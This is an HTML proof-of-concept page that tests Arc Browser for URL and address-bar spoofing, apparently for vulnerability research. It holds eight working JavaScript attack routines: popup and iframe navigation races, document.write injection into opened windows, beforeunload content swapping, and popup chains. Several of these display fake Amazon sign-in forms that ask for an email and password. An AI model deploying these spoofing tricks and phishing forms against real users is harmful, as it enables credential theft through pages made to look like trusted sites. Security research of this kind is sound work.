<!DOCTYPE html>
<html>
<head>
<title>PoC 10: Little Arc / Arc-Specific UI Exploitation</title>
<!--
  PoC 10: Arc-Specific Attack Surface Exploitation

  Target: Arc Browser (macOS, Chromium 146+)

  Technique: Exploits Arc-specific UI behaviors:

  1. Little Arc Popup: When links are opened from external apps, Arc uses
     "Little Arc" - a simplified popup with a minimal URL bar. This popup
     may have different URL display logic or security checks.

  2. Split View: Arc's split view shows two pages side by side with a shared
     URL bar that switches based on active pane. The transition between
     panes may have timing issues.

  3. Sidebar Tab Switching: Arc's sidebar navigation model differs from
     standard Chromium tab switching. Rapid tab creation + navigation
     may create URL display races.

  4. Arc's "Peek" Feature: Hovering over links shows a preview. The preview
     window URL display may be spoofable.

  5. Arc's Command Bar (Cmd+T): Custom URL entry that may parse differently.

  Additionally tests:
  - iframe URI-scheme navigation (CVE-2025-14812 pattern)
  - window.open with noopener/noreferrer combinations
  - Cross-document message-based coordination
-->
</head>
<body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
<h2>PoC 10: Arc-Specific UI Exploitation</h2>
<p>Tests Arc-specific features and UI elements for spoofing opportunities.</p>

<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; max-width: 600px;">
  <button onclick="testIframeURIScheme()" style="padding: 14px; font-size: 14px; cursor: pointer;">
    Test: iframe URI-Scheme Nav
  </button>
  <button onclick="testRapidTabCreation()" style="padding: 14px; font-size: 14px; cursor: pointer;">
    Test: Rapid Tab Creation
  </button>
  <button onclick="testSplitViewRace()" style="padding: 14px; font-size: 14px; cursor: pointer;">
    Test: Split View Race
  </button>
  <button onclick="testNoopenerRace()" style="padding: 14px; font-size: 14px; cursor: pointer;">
    Test: noopener Navigation
  </button>
  <button onclick="testIntentScheme()" style="padding: 14px; font-size: 14px; cursor: pointer;">
    Test: Custom URI Schemes
  </button>
  <button onclick="testBeforeUnloadRace()" style="padding: 14px; font-size: 14px; cursor: pointer;">
    Test: beforeunload Race
  </button>
  <button onclick="testPopupChain()" style="padding: 14px; font-size: 14px; cursor: pointer;">
    Test: Popup Chain Attack
  </button>
  <button onclick="testSandboxedIframe()" style="padding: 14px; font-size: 14px; cursor: pointer;">
    Test: Sandboxed iframe Nav
  </button>
</div>

<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>

<!-- Test iframes -->
<iframe id="testFrame" style="display:none;" sandbox="allow-scripts allow-top-navigation"></iframe>

<script>
function log(msg) {
  const el = document.getElementById('log');
  el.innerHTML += msg + '<br>';
  el.scrollTop = el.scrollHeight;
}

// Test 1: iframe URI-scheme navigation (CVE-2025-14812 pattern)
// ArcSearch iOS was vulnerable to address bar spoofing via
// "iframe-triggered URI-scheme navigation"
function testIframeURIScheme() {
  log('[1] Testing iframe URI-scheme navigation...');

  // Create an iframe that navigates via a URI scheme
  const iframe = document.createElement('iframe');
  iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
  document.body.appendChild(iframe);

  // Try various URI schemes that might trigger different navigation paths
  const schemes = [
    'https://www.amazon.com/',            // Standard HTTPS
    'javascript:void(0)',                  // JS URI (should be blocked for top nav)
    'data:text/html,<h1>Spoofed</h1>',   // Data URI
    'about:blank',                         // About blank
  ];

  // Set iframe src, then try to navigate the TOP frame from within
  iframe.srcdoc = `
    <html><body>
    <script>
      // Try to navigate the top frame via the iframe
      try {
        top.location = 'https://www.amazon.com/';
      } catch(e) {
        // Expected: cross-origin top navigation blocked
      }

      // Try window.open from iframe context
      try {
        var w = window.open('https://www.amazon.com/');
        if (w) {
          w.document.write('<h1>Content from iframe context</h1>');
        }
      } catch(e) {}
    <\/script>
    </body></html>
  `;

  log('[1] iframe with srcdoc created');
  log('[1] Testing if iframe can trigger top navigation or popup with URL spoofing');

  // Also test: iframe navigating itself via various schemes
  setTimeout(() => {
    // Create a second iframe that demonstrates the URI scheme attack
    const iframe2 = document.createElement('iframe');
    iframe2.style.cssText = 'width:100%;height:300px;border:1px solid #ccc;margin-top:10px;';
    iframe2.srcdoc = `
      <html><body style="font-family:Arial;padding:20px;">
        <h3>iframe URI-Scheme Navigation Test</h3>
        <p>This iframe will attempt to navigate the parent frame via URI schemes.</p>
        <button onclick="tryNav()">Attempt Top Navigation</button>
        <div id="result" style="margin-top:10px;font-family:monospace;font-size:12px;"></div>
        <script>
          function tryNav() {
            var res = document.getElementById('result');

            // Try intent-like URIs
            var uris = [
              'https://www.amazon.com/',
              'amazon://',
              'webcal://www.amazon.com/',
            ];

            uris.forEach(function(uri) {
              try {
                // Create a link and click it
                var a = document.createElement('a');
                a.href = uri;
                a.target = '_top';
                a.click();
                res.innerHTML += 'Tried: ' + uri + ' (no error)<br>';
              } catch(e) {
                res.innerHTML += 'Tried: ' + uri + ' ERROR: ' + e.message + '<br>';
              }
            });
          }
        <\/script>
      </body></html>
    `;
    document.body.appendChild(iframe2);
    log('[1] Interactive iframe test created');
  }, 100);
}

// Test 2: Rapid tab creation to overwhelm Arc's sidebar
function testRapidTabCreation() {
  log('[2] Testing rapid tab creation...');

  const targets = [
    'https://www.amazon.com/',
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
    'https://www.github.com/',
  ];

  let opened = 0;
  const windows = [];

  // Open many windows rapidly
  // Arc handles these in its sidebar - rapid creation may race the URL display
  for (let i = 0; i < 5; i++) {
    const w = window.open(targets[i % targets.length]);
    if (w) {
      windows.push(w);
      opened++;

      // Try to inject content immediately
      try {
        w.document.write(`<h1>Injected into tab ${i}</h1>`);
      } catch(e) {}
    }
  }

  log('[2] Opened ' + opened + ' tabs');
  log('[2] Check Arc sidebar - are all URLs displayed correctly?');
  log('[2] Rapid tab creation may cause URL display inconsistencies');

  // Close all after 5 seconds
  setTimeout(() => {
    windows.forEach(w => { try { w.close(); } catch(e) {} });
    log('[2] Cleanup: closed all test windows');
  }, 5000);
}

// Test 3: Split view race condition
function testSplitViewRace() {
  log('[3] Testing split view navigation race...');
  log('[3] NOTE: You need to manually enable split view in Arc');
  log('[3] Open this page in one pane and a legitimate site in the other');

  // Create iframes that simulate split view behavior
  document.body.innerHTML += `
    <div style="display:flex;gap:2px;height:400px;margin-top:20px;border:2px solid #333;border-radius:8px;overflow:hidden;">
      <div style="flex:1;position:relative;">
        <div style="background:#2a2a2a;padding:6px 12px;color:#ddd;font-size:12px;text-align:center;">
          <span style="color:#34c759;">&#128274;</span> amazon.com
        </div>
        <iframe src="about:blank" id="splitLeft" style="width:100%;height:calc(100% - 30px);border:none;"></iframe>
      </div>
      <div style="width:2px;background:#444;"></div>
      <div style="flex:1;position:relative;">
        <div style="background:#2a2a2a;padding:6px 12px;color:#ddd;font-size:12px;text-align:center;">
          <span style="color:#34c759;">&#128274;</span> google.com
        </div>
        <iframe src="about:blank" id="splitRight" style="width:100%;height:calc(100% - 30px);border:none;"></iframe>
      </div>
    </div>
  `;

  // Load phishing content in "Amazon" pane
  const leftFrame = document.getElementById('splitLeft');
  leftFrame.srcdoc = `
    <html><body style="font-family:Arial;padding:20px;">
      <h2 style="color:#ff9900;">amazon</h2>
      <h3>Sign In</h3>
      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
      <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
    </body></html>
  `;

  const rightFrame = document.getElementById('splitRight');
  rightFrame.srcdoc = `
    <html><body style="font-family:Arial;padding:20px;text-align:center;">
      <h2>Google</h2>
      <input type="text" placeholder="Search" style="width:80%;padding:10px;border:1px solid #ddd;border-radius:24px;">
    </body></html>
  `;

  log('[3] Split view simulation created');
  log('[3] In real Arc split view, the URL bar switches between panes');
  log('[3] Rapid clicking between panes may show wrong URL for active pane');
}

// Test 4: window.open with noopener
function testNoopenerRace() {
  log('[4] Testing noopener/noreferrer navigation...');

  // With noopener, we lose the window reference
  // But the popup opens independently, which may have different URL handling
  const popup = window.open('about:blank', '_blank', 'noopener');

  // We can't access this popup at all
  log('[4] Popup opened with noopener (no reference returned)');

  // Alternative: open WITHOUT noopener, inject, THEN set noopener-like behavior
  const popup2 = window.open('about:blank');
  if (popup2) {
    popup2.document.open();
    popup2.document.write(`
      <html><head><title>Amazon.com</title></head>
      <body style="font-family:Arial;padding:40px;">
        <h1 style="color:#ff9900;">amazon</h1>
        <p>This popup was opened without noopener, content injected,
           then the opener reference is nullified.</p>
        <h3>Sign In</h3>
        <input type="email" placeholder="Email" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
        <input type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
        <button style="padding:10px 30px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
        <script>
          // Nullify opener reference
          window.opener = null;
          // Navigate to amazon
          setTimeout(function() {
            window.location.href = 'https://www.amazon.com:' +
              (Math.floor(Math.random() * 60000) + 1024) + '/';
          }, 500);
        <\/script>
      </body></html>
    `);
    popup2.document.close();
    log('[4] Popup content injected, opener nullified, navigation queued');
    log('[4] Check popup URL bar after navigation attempt');
  }
}

// Test 5: Custom URI scheme handling
function testIntentScheme() {
  log('[5] Testing custom URI scheme handling...');

  // Arc may handle custom URI schemes differently
  // Some schemes may trigger Little Arc or special handling
  const schemes = [
    'arc://settings',           // Arc internal
    'archttp://www.amazon.com', // Non-standard
    'web+amazon://signin',      // Custom web+ scheme
    'x-web-search://amazon',    // Search scheme
  ];

  schemes.forEach(scheme => {
    try {
      const a = document.createElement('a');
      a.href = scheme;
      a.textContent = scheme;
      a.style.cssText = 'display:block;margin:4px 0;color:#007aff;';
      document.body.appendChild(a);
      log('[5] Created link: ' + scheme);
    } catch(e) {
      log('[5] Failed to create link for: ' + scheme + ' - ' + e.message);
    }
  });

  log('[5] Click each link above to test how Arc handles custom URI schemes');
  log('[5] Some may open in Little Arc with unexpected URL display');
}

// Test 6: beforeunload content injection race
function testBeforeUnloadRace() {
  log('[6] Testing beforeunload content injection...');

  // Set up beforeunload handler that injects content
  window.addEventListener('beforeunload', function(e) {
    // Inject content during the unload process
    // This may display while the new URL is shown in the address bar
    try {
      document.body.innerHTML = `
        <div style="font-family:Arial;max-width:400px;margin:40px auto;">
          <h1 style="color:#ff9900;">amazon</h1>
          <h3>Sign In Required</h3>
          <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
          <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
          <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
        </div>
      `;
      document.title = 'Amazon.com Sign In';
    } catch(ex) {}
  });

  log('[6] beforeunload handler registered');
  log('[6] Now navigating to amazon.com...');
  log('[6] Content should be injected during the unload transition');

  // Navigate after a short delay
  setTimeout(() => {
    // Navigate to Amazon on a non-standard port (creates timing window)
    let port;
    do {
      port = Math.floor(Math.random() * 60000) + 1024;
    } while ([8080, 8443].includes(port));

    window.location.href = 'https://www.amazon.com:' + port + '/';
  }, 500);
}

// Test 7: Popup chain attack
function testPopupChain() {
  log('[7] Testing popup chain attack...');

  // Open popup A
  const popupA = window.open('about:blank', 'chainA');
  if (!popupA) { log('[7] BLOCKED'); return; }

  // Popup A opens popup B
  popupA.document.open();
  popupA.document.write(`
    <html><head><title>Redirecting...</title></head>
    <body>
      <script>
        // Open popup B to amazon
        var popupB = window.open('https://www.amazon.com/', 'chainB');

        // Try to inject content into popup B
        if (popupB) {
          setTimeout(function() {
            try {
              popupB.document.open();
              popupB.document.write('<h1>Injected via popup chain!</h1>');
              popupB.document.close();
              document.title = 'Chain injection successful!';
            } catch(e) {
              document.title = 'Chain injection failed: ' + e.message;
            }
          }, 100);
        }

        // Close popup A after chain is established
        setTimeout(function() {
          window.close();
        }, 2000);
      <\/script>
    </body></html>
  `);
  popupA.document.close();

  log('[7] Popup A created, will open popup B to amazon.com');
  log('[7] Then tries to inject content into B from A');
  log('[7] This tests if popup chain relationships bypass access controls');
}

// Test 8: Sandboxed iframe top navigation
function testSandboxedIframe() {
  log('[8] Testing sandboxed iframe top navigation...');

  // Sandboxed iframes with allow-top-navigation can navigate the top frame
  // Combined with allow-scripts, they might create interesting race conditions
  const iframe = document.createElement('iframe');
  iframe.sandbox = 'allow-scripts allow-top-navigation-by-user-activation';
  iframe.style.cssText = 'width:100%;height:200px;border:2px solid #ccc;margin-top:10px;';
  iframe.srcdoc = `
    <html><body style="font-family:Arial;padding:20px;text-align:center;">
      <h3>Sandboxed iframe</h3>
      <p>Click the button to attempt top-frame navigation:</p>
      <button onclick="navTop()" style="padding:10px 20px;font-size:16px;cursor:pointer;">
        Navigate Top Frame
      </button>
      <div id="res" style="margin-top:10px;font-family:monospace;font-size:12px;"></div>
      <script>
        function navTop() {
          var res = document.getElementById('res');

          // Method 1: Direct top navigation
          try {
            top.location = 'https://www.amazon.com/';
            res.innerHTML += 'top.location set to amazon.com<br>';
          } catch(e) {
            res.innerHTML += 'top.location failed: ' + e.message + '<br>';
          }
        }

        // Auto-try without user interaction
        // (should fail due to user-activation requirement)
        try {
          top.location = 'https://www.amazon.com/';
        } catch(e) {
          // Expected
        }
      <\/script>
    </body></html>
  `;
  document.body.appendChild(iframe);

  log('[8] Sandboxed iframe created with allow-top-navigation-by-user-activation');
  log('[8] Click the button inside the iframe to test navigation');
  log('[8] If the top frame navigates but content from iframe persists = issue');
}
</script>
